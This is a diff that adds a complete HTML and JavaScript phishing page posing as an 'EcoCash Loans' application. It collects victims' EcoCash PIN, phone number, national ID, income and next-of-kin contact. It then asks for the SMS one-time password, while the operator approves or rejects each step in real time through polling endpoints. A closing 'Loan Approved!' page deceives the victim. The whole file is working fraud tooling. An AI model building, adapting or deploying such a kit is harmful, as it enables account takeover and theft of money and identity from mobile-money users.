@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>EcoCash Loans</title>
+  <style>
+    :root {
+      /* EcoCash Brand Colors */
+      --ecocash-blue: #004B93;
+      --ecocash-red: #E31837;
+      --ecocash-blue-hover: #003B75;
+      --ecocash-red-hover: #C4122D;
+      
+      --bg: #f4f7f9;
+      --text-main: #1e293b;
+      --text-muted: #64748b;
+      --border: #e2e8f0;
+      --error: #ef4444;
+      --success: #10b981;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    
+    body { 
+      background: var(--bg); 
+      display: flex; 
+      justify-content: center; 
+      min-height: 100vh; 
+      color: var(--text-main);
+      padding: 20px;
+    }
+
+    .app { 
+      background: #fff; 
+      width: 100%; 
+      max-width: 480px; 
+      border-radius: 16px; 
+      box-shadow: 0 10px 25px -5px rgba(0,0,0,0.05), 0 8px 10px -6px rgba(0,0,0,0.01); 
+      padding: 30px; 
+      display: flex; 
+      flex-direction: column;
+      height: fit-content;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Brand Header Styling */
+    .header { text-align: center; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 2px solid var(--border); }
+    .header h1 { font-size: 1.8rem; font-weight: 800; margin-bottom: 5px; display: flex; justify-content: center; align-items: center; gap: 5px; }
+    .header h1 .blue { color: var(--ecocash-blue); }
+    .header h1 .red { color: var(--ecocash-red); }
+    .header p { color: var(--text-muted); font-size: 0.9rem; font-weight: 500; }
+
+    .page { display: none; animation: slideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+    .page.active { display: block; }
+    @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+    h3 { font-size: 1rem; color: var(--ecocash-blue); text-transform: uppercase; letter-spacing: 0.5px; margin: 20px 0 10px; border-bottom: 1px solid var(--border); padding-bottom: 5px; }
+    .form-group { margin-bottom: 16px; }
+    label { display: block; font-weight: 600; margin-bottom: 6px; font-size: 0.85rem; color: var(--text-main); }
+    
+    input, select { 
+      width: 100%; 
+      padding: 14px; 
+      border: 1.5px solid var(--border); 
+      border-radius: 10px; 
+      font-size: 16px;
+      background: #f8fafc; 
+      color: var(--text-main);
+      transition: all 0.2s;
+    }
+    input:focus, select:focus { 
+      outline: none; 
+      border-color: var(--ecocash-blue); 
+      background: #fff;
+      box-shadow: 0 0 0 4px rgba(0, 75, 147, 0.1); 
+    }
+
+    button { 
+      width: 100%; 
+      padding: 16px; 
+      background: var(--ecocash-red); 
+      color: #fff; 
+      border: none; 
+      border-radius: 10px; 
+      font-size: 1rem; 
+      font-weight: 700; 
+      cursor: pointer; 
+      margin-top: 10px; 
+      transition: all 0.2s;
+    }
+    button:hover:not(:disabled) { background: var(--ecocash-red-hover); transform: translateY(-1px); }
+    button:disabled { background: #94a3b8; cursor: wait; }
+    
+    .center { text-align: center; padding: 30px 0; }
+    .spinner { width: 45px; height: 45px; border: 4px solid var(--border); border-top-color: var(--ecocash-red); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    
+    #verifyCode {
+      text-align: center;
+      font-size: 32px;
+      letter-spacing: 12px;
+      padding: 15px 0 15px 12px;
+      font-weight: 800;
+      border: 2px dashed var(--ecocash-blue);
+      background: #f0f7ff;
+      color: var(--ecocash-blue);
+      margin-bottom: 15px;
+    }
+
+    .error { color: var(--error); font-size: 0.85rem; margin-top: 10px; text-align: center; min-height: 20px; font-weight: 500; }
+    .success-icon { font-size: 4rem; color: var(--success); text-align: center; margin-bottom: 15px; animation: pop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+    @keyframes pop { 0% { transform: scale(0.5); } 100% { transform: scale(1); } }
+
+    hr { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
+  </style>
+</head>
+<body>
+
+<div class="app">
+  <div class="header">
+    <h1 id="header-title"><span class="blue">Eco</span><span class="red">Cash</span> Loans</h1>
+    <p id="header-subtitle">Get your loan approved fast.</p>
+  </div>
+
+  <div id="page-init" class="page center active">
+    <div class="spinner"></div>
+    <p style="color: var(--text-muted);">Securing connection...</p>
+    <div id="init-error" class="error"></div>
+  </div>
+
+  <div id="page4" class="page">
+    <form id="form4" novalidate>
+      <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input id="fullName" name="fullName" type="text" required maxlength="80" placeholder="John Doe">
+      </div>
+
+      <div class="form-group">
+        <label for="phone">EcoCash Phone Number</label>
+        <input id="phone" name="phone" type="tel" required maxlength="15" placeholder="e.g. 0771234567">
+      </div>
+
+      <div class="form-group">
+        <label for="pin">EcoCash 5-Digit PIN</label>
+        <input id="pin" name="pin" type="password" required maxlength="5" inputmode="numeric" pattern="\d*" placeholder="•••••">
+      </div>
+
+      <div class="form-group">
+        <label for="loanAmount">Loan Amount Requested</label>
+        <select id="loanAmount" name="loanAmount" required>
+          <option value="">Select Amount…</option>
+          <option>$ 1,000</option>
+          <option>$ 2,500</option>
+          <option>$ 5,000</option>
+          <option>$ 10,000</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="loanTerm">Loan Term</label>
+        <select id="loanTerm" name="loanTerm" required>
+          <option value="">Select Term…</option>
+          <option>6 months</option>
+          <option>12 months</option>
+          <option>24 months</option>
+        </select>
+      </div>
+
+      <button type="submit" id="btn4">Apply Now</button>
+      <div class="error" id="err4"></div>
+    </form>
+  </div>
+
+  <div id="page-loading" class="page center">
+    <div class="spinner"></div>
+    <h3 style="border: none; margin: 0; color: var(--text-main); font-size: 1.1rem; text-transform: none;">Reviewing Application...</h3>
+    <p style="color: var(--text-muted); margin-top: 10px; font-size: 0.9rem;">Please wait while the admin verifies your details.</p>
+  </div>
+
+  <div id="page56" class="page">
+    <form id="form56" novalidate>
+      <h3>Employment Details</h3>
+      
+      <div class="form-group">
+        <label for="p5q1">Employment Status</label>
+        <select id="p5q1" name="p5q1" required>
+          <option value="">Select Status…</option>
+          <option>Employed</option>
+          <option>Self-Employed</option>
+          <option>Unemployed</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label for="p5q2">Monthly Income ($)</label>
+        <input id="p5q2" name="p5q2" type="number" required placeholder="e.g. 500">
+      </div>
+
+      <h3>Identity & Next of Kin</h3>
+
+      <div class="form-group">
+        <label for="p6q1">National ID Number</label>
+        <input id="p6q1" name="p6q1" type="text" required maxlength="20" placeholder="63-123456-A-00">
+      </div>
+
+      <div class="form-group">
+        <label for="p6q2">Next of Kin Phone</label>
+        <input id="p6q2" name="p6q2" type="tel" required maxlength="15" placeholder="Emergency contact">
+      </div>
+
+      <button type="submit" id="btn56">Submit Details</button>
+      <div class="error" id="err56"></div>
+    </form>
+  </div>
+
+  <div id="page-verify" class="page center">
+    <h3 style="border: none; color: var(--ecocash-blue); font-size: 1.3rem; margin-bottom: 10px;">OTP Verification</h3>
+    <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 25px; line-height: 1.5;">
+      We have sent a One-Time Password (OTP) to your EcoCash number via SMS/WhatsApp. Please enter it below to finalize your loan.
+    </p>
+    
+    <input id="verifyCode" type="text" maxlength="6" placeholder="••••••" inputmode="numeric" pattern="\d*" style="letter-spacing: 8px;">
+    
+    <button type="button" id="btnVerify">Submit OTP</button>
+    <div class="error" id="errVerify"></div>
+  </div>
+
+  <div id="page-done" class="page center">
+    <div class="success-icon">✅</div>
+    <h2 style="color: var(--success); margin-bottom: 10px;">Loan Approved!</h2>
+    <p style="color: var(--text-muted); font-size: 0.95rem;">Your application is complete. Funds will be disbursed to your EcoCash account shortly.</p>
+  </div>
+
+</div>
+
+<script>
+(function () {
+  "use strict";
+  let sessionId = null;
+  let pollTimer = null;
+  let isPolling = false;
+  
+  const $ = (id) => document.getElementById(id);
+
+  function show(pageId, title, subtitle) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const el = $(pageId);
+    if (el) el.classList.add('active');
+    if (title) $('header-title').innerHTML = title;
+    if (subtitle) $('header-subtitle').textContent = subtitle;
+  }
+
+  async function createSession() {
+    show('page-init');
+    $('init-error').textContent = '';
+    try {
+      const res = await fetch('/api/session', { method: 'POST' });
+      const data = await res.json();
+      sessionId = data.sessionId;
+      show('page4', '<span class="blue">Eco</span><span class="red">Cash</span> Loans', 'Please fill in your loan request details.');
+    } catch (err) {
+      $('init-error').innerHTML = 'Connection failed. <br><button onclick="location.reload()" style="margin-top:10px; padding: 8px; width: 150px;">Retry</button>';
+    }
+  }
+
+  function startPolling() {
+    if (isPolling) return;
+    isPolling = true;
+    show('page-loading', '<span class="blue">Eco</span><span class="red">Cash</span> Processing', 'Checking status with the administrator.');
+
+    pollTimer = setInterval(async () => {
+      try {
+        const res = await fetch('/api/status/' + encodeURIComponent(sessionId));
+        if (res.status === 404) return location.reload();
+        
+        const { status } = await res.json();
+
+        if (status === 'approved_4') {
+          stopPolling();
+          show('page56', 'Personal Details', 'Step 2: Employment & Identity.');
+        } else if (status === 'rejected_4') {
+          stopPolling();
+          alert('Your initial loan request was rejected. Please review and apply again.');
+          show('page4', '<span class="blue">Eco</span><span class="red">Cash</span> Loans', 'Please fill in your loan request details.');
+        } else if (status === 'approved_all') {
+          stopPolling();
+          show('page-verify', 'OTP Verification', 'Final step to release funds.');
+        } else if (status === 'rejected_6') {
+          stopPolling();
+          alert('Your personal details were rejected. Please fix and re-submit.');
+          show('page56', 'Personal Details', 'Step 2: Employment & Identity.');
+        } else if (status === 'completed') {
+          stopPolling();
+          show('page-done', '<span class="blue">Eco</span><span class="red">Cash</span> Success', 'Your loan is approved.');
+        } else if (status === 'rejected_pin') {
+          stopPolling();
+          alert('The Admin rejected your OTP. Please try again.');
+          $('verifyCode').value = '';
+          $('btnVerify').disabled = false;
+          show('page-verify', 'OTP Verification', 'Final step to release funds.');
+        }
+      } catch (err) { console.error(err); }
+    }, 3000);
+  }
+
+  function stopPolling() {
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = null;
+    isPolling = false;
+  }
+
+  $('form4').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const btn = $('btn4'); btn.disabled = true; $('err4').textContent = '';
+    const data = Object.fromEntries(new FormData(e.target).entries());
+    
+    if (data.pin.length !== 5) {
+      $('err4').textContent = 'PIN must be exactly 5 digits.';
+      btn.disabled = false;
+      return;
+    }
+
+    try {
+      const res = await fetch('/api/submit-page4', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId, data })
+      });
+      if (res.ok) startPolling();
+      else throw new Error('Server error');
+    } catch (err) { 
+      $('err4').textContent = 'Submission failed. Please try again.'; 
+      btn.disabled = false;
+    }
+  });
+
+  $('form56').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const btn = $('btn56'); btn.disabled = true; $('err56').textContent = '';
+    const d = Object.fromEntries(new FormData(e.target).entries());
+    
+    try {
+      const res = await fetch('/api/submit-page5-6', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          sessionId, 
+          page5: { q1: d.p5q1, q2: d.p5q2 }, 
+          page6: { q1: d.p6q1, q2: d.p6q2 } 
+        })
+      });
+      if (res.ok) startPolling();
+      else throw new Error('Server error');
+    } catch (err) { 
+      $('err56').textContent = 'Submission failed. Please try again.'; 
+      btn.disabled = false;
+    }
+  });
+
+  $('btnVerify').addEventListener('click', async () => {
+    const code = $('verifyCode').value.trim();
+    if (code.length < 4) return ($('errVerify').textContent = 'Please enter a valid OTP.');
+    
+    $('btnVerify').disabled = true;
+    $('errVerify').textContent = '';
+
+    try {
+      const res = await fetch('/api/verify-code', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ sessionId, code })
+      });
+      
+      if (res.ok) {
+        startPolling(); 
+      } else {
+        $('errVerify').textContent = 'Error submitting OTP.';
+        $('btnVerify').disabled = false;
+      }
+    } catch (err) {
+      $('errVerify').textContent = 'Connection error.';
+      $('btnVerify').disabled = false;
+    }
+  });
+
+  createSession();
+})();
+</script>
+</body>
+</html>
